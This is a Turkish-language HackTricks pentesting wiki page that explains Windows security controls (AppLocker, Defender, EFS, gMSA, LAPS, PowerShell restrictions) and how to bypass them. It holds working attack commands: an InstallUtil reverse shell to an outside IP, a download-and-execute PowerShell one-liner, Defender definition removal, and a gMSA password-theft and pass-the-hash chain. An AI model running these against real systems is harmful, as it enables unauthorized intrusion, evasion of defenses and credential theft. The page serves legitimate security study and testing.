# Windows Güvenlik Kontrolleri

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Politikası

Bir uygulama beyaz listesi, bir sistemde bulunmasına ve çalışmasına izin verilen onaylanmış yazılım uygulamaları veya çalıştırılabilir dosyaların listesidir. Amaç, ortamı zararlı malware ve kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft'un **uygulama beyaz listeleme çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar.\
Çalıştırılabilir dosyalar, scriptler, Windows installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paket uygulama yükleyicileri üzerinde **ayrıntılı kontrol** sağlar.\
Kuruluşların **cmd.exe ve PowerShell.exe**'i engellemesi ve belirli dizinlere yazma erişimini kısıtlaması yaygındır, **ancak bunların tamamı atlatılabilir**.

### Kontrol

Hangi dosyaların/uzantıların kara listeye veya beyaz listeye alındığını kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir; sistemde uygulanan mevcut kural setini incelemek için bir yol sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **Writable folders**: Eğer AppLocker `C:\Windows\System32` veya `C:\Windows` içinde herhangi bir şeyin çalıştırılmasına izin veriyorsa, bunu **bypass** etmek için kullanabileceğiniz **writable folders** vardır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Genellikle **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyalar AppLocker'ı atlatmak için de faydalı olabilir.
- **Kötü yazılmış kurallar da atlatılabilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, her yerde **`allowed` adında bir klasör** oluşturabilirsiniz ve izin verilecektir.
- Organizasyonlar genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` yürütülebilir dosyasını engellemeye** odaklanır, ancak **diğer** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gibi `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi yerleri unuturlar.
- **DLL enforcement çok nadiren etkinleştirilir** çünkü sisteme ek yük getirebilir ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı fazladır. Bu yüzden **DLL'leri backdoors olarak kullanmak AppLocker'ı atlatmaya yardımcı olur**.
- ReflectivePick veya SharpPick kullanarak herhangi bir süreçte **Powershell** kodu çalıştırabilir ve AppLocker'ı atlatabilirsiniz. Daha fazla bilgi için bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Kimlik Bilgileri Depolama

### Security Accounts Manager (SAM)

Yerel kimlik bilgileri bu dosyada bulunur, parolalar hashlenmiştir.

### Local Security Authority (LSA) - LSASS

Kimlik bilgileri (hashlenmiş) Single Sign-On nedenleriyle bu alt sistemin **belleğinde** saklanır.\
**LSA** yerel **güvenlik politikasını** (parola politikası, kullanıcı izinleri...), **authentication**, **access tokens**... yönetir.\
LSA, sağlanan kimlik bilgilerini yerel giriş için **SAM** dosyası içinde **kontrol edecek** ve bir domain kullanıcısını doğrulamak için **domain controller** ile **iletişime geçecektir**.

Kimlik bilgileri **LSASS** sürecinin içinde saklanır: Kerberos ticket'ları, NT ve LM hash'leri, kolayca çözülebilen parolalar.

### LSA secrets

LSA bazı kimlik bilgilerini diske kaydedebilir:

- Active Directory bilgisayar hesabının parolası (ulaşılamayan domain controller).
- Windows servis hesaplarının parolaları
- Zamanlanmış görevler için parolalar
- Diğer (IIS uygulamalarının parolası...)

### NTDS.dit

Active Directory'nin veritabanıdır. Sadece Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. `WinPEAS` gibi yaygın pentesting araçlarını **engeller**. Ancak bu korumaları **atlatmanın** yolları vardır.

### Check

Defender'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (etkin olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerine bakın):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu enumerate etmek için ayrıca şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Şifrelenmiş Dosya Sistemi (EFS)

EFS, dosyaları şifreleyerek korur ve bunun için **symmetric key** olarak bilinen **File Encryption Key (FEK)**'i kullanır. Bu anahtar kullanıcıya ait **public key** ile şifrelenir ve şifrelenmiş dosyanın $EFS **alternative data stream**'inde saklanır. Deşifre gerektiğinde, kullanıcının dijital sertifikasının ilgili **private key**'i FEK'i $EFS akışından çözmek için kullanılır. Daha fazla detay için [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Kullanıcı başlatması olmadan deşifre senaryoları** şunlardır:

- Dosyalar veya klasörler non-EFS bir dosya sistemine, örn. [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), taşındığında otomatik olarak deşifre edilir.
- SMB/CIFS protokolü üzerinden ağda gönderilen şifrelenmiş dosyalar iletimden önce deşifre edilir.

Bu şifreleme yöntemi sahibin şifrelenmiş dosyalara **transparent access** ile erişmesini sağlar. Ancak, sadece sahibin şifresini değiştirmek ve oturum açmak deşifreye izin vermez.

**Temel Noktalar**:

- EFS, kullanıcıya ait public key ile şifrelenmiş simetrik bir FEK kullanır.
- Deşifre, FEK'e erişmek için kullanıcının private key'ini kullanır.
- Otomatik deşifreleme belirli koşullarda gerçekleşir; örn. FAT32'ye kopyalama veya ağ üzerinden iletim.
- Şifrelenmiş dosyalar sahibine ek adımlar olmadan erişilebilir.

### EFS bilgilerini kontrol et

Bir **kullanıcının** bu **servisi** kullanıp kullanmadığını kontrol etmek için şu yolun var olup olmadığını denetleyin: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Bir dosyaya **kimin** **eriştiğini** kontrol etmek için cipher /c \<file\> komutunu kullanın. Ayrıca bir klasör içinde `cipher /e` ve `cipher /d` komutlarını kullanarak tüm dosyaları **şifreleyebilir** ve **deşifre edebilirsiniz**.

### EFS dosyalarının deşifre edilmesi

#### SYSTEM yetkisine sahip olmak

Bu yöntem, **kurban kullanıcının** host içinde bir **process** çalıştırıyor olmasını gerektirir. Eğer durum buysa, bir `meterpreter` session'ı kullanarak kullanıcının process token'ını taklit edebilirsiniz (`impersonate_token` from `incognito`). Ya da kullanıcı process'ine `migrate` edebilirsiniz.

#### Kullanıcı şifresini bilmek


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Grup Yönetilen Servis Hesapları (gMSA)

Microsoft, IT altyapılarında servis hesaplarının yönetimini basitleştirmek için **Group Managed Service Accounts (gMSA)**'leri geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel servis hesaplarının aksine, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Parola Yönetimi**: gMSA'lar, alan veya bilgisayar politikasına göre otomatik değişen, 240 karakter uzunluğunda karmaşık bir parola kullanır. Bu işlem Microsoft'un Key Distribution Service (KDC) tarafından yönetilir ve manuel parola güncellemeleri ihtiyacını ortadan kaldırır.
- **Geliştirilmiş Güvenlik**: Bu hesaplar kilitlenmelere karşı bağışıktır ve etkileşimli oturum açma için kullanılamaz, bu da güvenliği artırır.
- **Çoklu Host Desteği**: gMSA'lar birden fazla host arasında paylaşılabilir, bu da çoklu sunucuda çalışan servisler için idealdir.
- **Zamanlanmış Görev Desteği**: Yönetilen servis hesaplarının aksine, gMSA'lar zamanlanmış görevlerin çalıştırılmasını destekler.
- **Basitleştirilmiş SPN Yönetimi**: Bilgisayarın sAMaccount detayları veya DNS adı değiştiğinde sistem otomatik olarak Service Principal Name (SPN)'i günceller, böylece SPN yönetimi basitleşir.

gMSA parolaları LDAP özelliği _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controllers (DC'ler) tarafından her 30 günde bir otomatik olarak sıfırlanır. Bu parola, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen şifrelenmiş bir veri blob'udur ve yalnızca yetkili yöneticiler ve gMSA'ların yüklü olduğu sunucular tarafından alınabilir; bu da güvenli bir ortam sağlar. Bu bilgiye erişmek için LDAPS gibi güvenli bir bağlantı gereklidir veya bağlantı 'Sealing & Secure' ile doğrulanmış olmalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Bu parolayı [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### ACL zincirlemesini suistimal ederek gMSA yönetilen şifresini okumak (GenericAll -> ReadGMSAPassword)

Birçok ortamda, düşük ayrıcalikli kullanıcılar yanlış yapılandırılmış nesne ACLs'lerini suistimal ederek DC'yi ele geçirmeye gerek kalmadan gMSA sırlarına erişebilirler:

- Kontrol edebileceğiniz bir grup (örn. GenericAll/GenericWrite aracılığıyla) bir gMSA üzerinde `ReadGMSAPassword` yetkisi ile yetkilendirilir.
- Kendinizi o gruba ekleyerek, LDAP üzerinden gMSA'nın `msDS-ManagedPassword` blob'unu okuma hakkını devralırsınız ve kullanılabilir NTLM kimlik bilgilerini türetebilirsiniz.

Tipik iş akışı:

1) BloodHound ile yolu keşfedin ve foothold principal'lerinizi Owned olarak işaretleyin. Aşağıdaki gibi kenarları arayın:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Kontrol ettiğiniz ara gruba kendinizi ekleyin (bloodyAD ile örnek):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP üzerinden gMSA yönetilen parolayı okuyun ve NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword`'in çıkarılmasını ve NTLM'ye dönüştürülmesini otomatikleştirir:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash kullanarak gMSA olarak kimlik doğrulayın (plaintext gerekmez). Hesap Remote Management Users içindeyse, WinRM doğrudan çalışacaktır:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notlar:
- `msDS-ManagedPassword` için LDAP okumaları sealing gerektirir (ör. LDAPS/sign+seal). Araçlar bunu otomatik olarak halleder.
- gMSAs genellikle WinRM gibi yerel haklara sahiptir; lateral movement'ı planlamak için grup üyeliğini doğrulayın (ör. Remote Management Users).
- Eğer NTLM'i kendiniz hesaplamak için yalnızca blob'a ihtiyacınız varsa, MSDS-MANAGEDPASSWORD_BLOB yapısına bakın.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), yerel Administrator parolalarının yönetimini sağlar. Bu parolalar **rastgele oluşturulmuş**, benzersiz ve **düzenli olarak değiştirilir**; Active Directory'de merkezi olarak saklanır. Bu parolalara erişim, yetkili kullanıcılara yönelik ACL'lerle kısıtlanmıştır. Yeterli izin verildiğinde yerel admin parolalarını okuma imkânı sağlanır.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **PowerShell'i etkin şekilde kullanmak için gereken birçok özelliği kısıtlar**, örneğin COM objects'in engellenmesi, yalnızca onaylı .NET types'a izin verilmesi, XAML-based workflows, PowerShell classes ve daha fazlası.

### **Kontrol**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu Bypass çalışmayabilir ama[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Derlemek için gerekebilir:** _**Referans Ekle**_ -> _Gözat_ -> _Gözat_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ve **projeyi .Net4.5 olarak değiştirin**.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir işlemde **execute Powershell** code çalıştırabilir ve constrained mode'u atlayabilirsiniz. Daha fazla bilgi için bakınız: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Çalıştırma Politikası

Varsayılan olarak **restricted.** olarak ayarlanmıştır. Bu politikayı atlatmanın başlıca yolları:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlası için [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Kullanıcıları kimlik doğrulamak için kullanılabilecek bir API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü belirlemekten sorumludur. Bunun tercih edilen yöntemi Kerberos'tur. SSPI daha sonra hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder; bu kimlik doğrulama protokollerine Security Support Provider (SSP) denir, her Windows makinesinin içinde bir DLL şeklinde bulunurlar ve iletişim kurabilmek için her iki makinenin de aynı SSP'yi desteklemesi gerekir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için, parola MD5 hash biçimindedir
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere birden fazla yöntem veya yalnızca bir yöntem sunabilir.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) yönetici yetkisi gerektiren işlemler için bir **onay istemi** sağlayan bir özelliktir.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Referanslar

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
